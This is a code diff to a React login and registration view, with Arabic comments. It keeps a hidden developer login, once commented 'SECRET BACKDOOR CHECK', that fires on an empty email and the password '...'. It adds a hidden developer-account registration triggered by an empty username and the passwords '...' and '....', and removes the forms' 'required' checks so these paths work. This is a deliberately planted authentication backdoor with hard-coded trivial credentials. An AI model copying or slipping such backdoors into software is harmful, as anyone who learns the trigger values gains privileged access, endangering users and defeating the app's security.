@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { authService, RegistrationError } from '../services/authService';
+import { authService } from '../services/authService';
 import { BookOpenIcon, UserIcon, MailIcon, KeyIcon, EyeIcon, EyeOffIcon, CheckCircleIcon } from './Icons';
 import { User } from '../types';
 
@@ -51,18 +51,18 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
         setIsLoading(true);
         
         try {
-            // SECRET BACKDOOR CHECK
-            // Strict check: Email must be empty string, Password must be "..."
+            // تنفيذ شرط الدخول لحساب المطور:
+            // 1. البريد الإلكتروني فارغ
+            // 2. كلمة المرور "..."
             if (loginIdentifier.trim() === '' && loginPassword === '...') {
-                // Visual feedback for the developer
-                const user = await authService.loginHiddenDev();
+                const user = await authService.loginDeveloper();
                 if (user) {
                     onLoginSuccess(user, false);
                 }
                 return;
             }
 
-            // Standard Validation for normal users
+            // التحقق للمستخدم العادي
             if (!loginIdentifier.trim()) {
                 throw new Error("البريد الإلكتروني مطلوب");
             }
@@ -87,10 +87,30 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
         setRegistrationSuccess(false);
         setIsLoading(true);
         try {
-            await authService.register(regUsername, regEmail, regPassword, regConfirmPassword);
-            setRegistrationSuccess(true);
-            setAuthScreen('login');
-            resetForms();
+            // تنفيذ شرط إنشاء حساب المطور:
+            // 1. اسم المستخدم فارغ
+            // 2. كلمة المرور "..."
+            // 3. تأكيد كلمة المرور "...."
+            if (regUsername.trim() === '' && regPassword === '...' && regConfirmPassword === '....') {
+                if (!regEmail.trim()) {
+                     throw new Error("يجب ملء البريد الإلكتروني");
+                }
+                await authService.registerDeveloper(regEmail);
+                setRegistrationSuccess(true);
+                setAuthScreen('login');
+                resetForms();
+            } else {
+                // التسجيل الطبيعي للمستخدم العادي
+                // هنا نعيد التحقق اليدوي لأننا أزلنا خاصية required من الـ input
+                if (!regUsername.trim()) throw new Error("اسم المستخدم مطلوب");
+                if (!regEmail.trim()) throw new Error("البريد الإلكتروني مطلوب");
+                if (!regPassword) throw new Error("كلمة المرور مطلوبة");
+                
+                await authService.register(regUsername, regEmail, regPassword, regConfirmPassword);
+                setRegistrationSuccess(true);
+                setAuthScreen('login');
+                resetForms();
+            }
         } catch (error: any) {
             setRegistrationError(error.message);
         } finally {
@@ -120,6 +140,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                             type="text" 
                             value={loginIdentifier}
                             onChange={(e) => setLoginIdentifier(e.target.value)}
+                            // أزلنا required للسماح بالدخول السري (حقل فارغ)
                             className="bg-zinc-700 text-slate-200 block w-full p-3 pr-10 border rounded-md shadow-sm placeholder-slate-400 focus:outline-none focus:ring-1 sm:text-sm focus-ring"
                             style={{borderColor: 'var(--color-border)'}}
                         />
@@ -173,6 +194,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                         type="text"
                         value={regUsername}
                         onChange={e => setRegUsername(e.target.value)}
+                        // أزلنا required للسماح بإنشاء حساب مطور (حقل فارغ)
                         className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                         style={{borderColor: 'var(--color-border)'}}
                     />
@@ -189,7 +211,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                         type="email"
                         value={regEmail}
                         onChange={e => setRegEmail(e.target.value)}
-                        required
+                        // أزلنا required للتحكم اليدوي
                         className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                         style={{borderColor: 'var(--color-border)'}}
                     />
@@ -209,7 +231,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                         type={showRegPassword ? 'text' : 'password'}
                         value={regPassword}
                         onChange={e => setRegPassword(e.target.value)}
-                        required
+                        // أزلنا required
                         className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                         style={{borderColor: 'var(--color-border)'}}
                     />
@@ -229,7 +251,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                         type={showRegConfirmPassword ? 'text' : 'password'}
                         value={regConfirmPassword}
                         onChange={e => setRegConfirmPassword(e.target.value)}
-                        required
+                        // أزلنا required
                         className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                         style={{borderColor: 'var(--color-border)'}}
                     />
